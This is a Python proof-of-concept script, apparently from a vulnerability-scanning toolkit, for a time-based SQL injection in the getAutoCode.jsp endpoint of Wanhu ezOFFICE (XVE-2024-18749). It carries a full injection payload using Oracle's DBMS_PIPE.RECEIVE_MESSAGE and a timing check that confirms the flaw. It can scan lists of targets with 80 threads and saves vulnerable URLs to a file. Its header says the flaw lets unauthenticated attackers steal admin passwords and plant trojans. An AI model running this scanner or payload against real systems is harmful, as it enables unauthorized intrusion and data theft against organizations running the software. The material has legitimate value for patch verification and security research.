# -*- coding: utf-8 -*-
# 万户 ezOFFICE协同管理平台 getAutoCode SQL注入漏洞(XVE-2024-18749)
# app="万户网络-ezOFFICE"
# 产品简介:万户OA ezoffice是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。
# 漏洞概述:万户 ezOFFICE getAutoCode.jsp 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
    \x1b[38m██╗  ██╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗       ██╗ █████╗ ███████╗██╗  ██╗ █████╗ 
    \x1b[36m╚██╗██╔╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ███║██╔══██╗╚════██║██║  ██║██╔══██╗
    \x1b[34m ╚███╔╝ ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗╚██║╚█████╔╝    ██╔╝███████║╚██████║
    \x1b[35m ██╔██╗ ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝ ██║██╔══██╗   ██╔╝ ╚════██║ ╚═══██║
    \x1b[31m██╔╝ ██╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║       ██║╚█████╔╝   ██║       ██║ █████╔╝
    \x1b[33m╚═╝  ╚═╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝       ╚═╝ ╚════╝    ╚═╝       ╚═╝ ╚════╝ 
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
            --author:Kucei  --Version:万户_ezOFFICE协同管理平台_getAutoCode_SQL注入漏洞(XVE-2024-18749)
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('XVE-2024-18749')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = '/defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&head=2&field=field_name&tabName=tfield'
    url_payload2 = '/defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&head=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C6%29--+YJdO&field=field_name&tabName=tfield'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Connection': 'close',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response1 = requests.get(url=target+url_payload1,headers=headers,verify=False,timeout=7)
        response2 = requests.get(url=target+url_payload2,headers=headers,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time2 - time1 >= 3.5:
            print( f"[+] {target} 存在漏洞！\n")
            with open('XVE-2024-18749.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload2+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()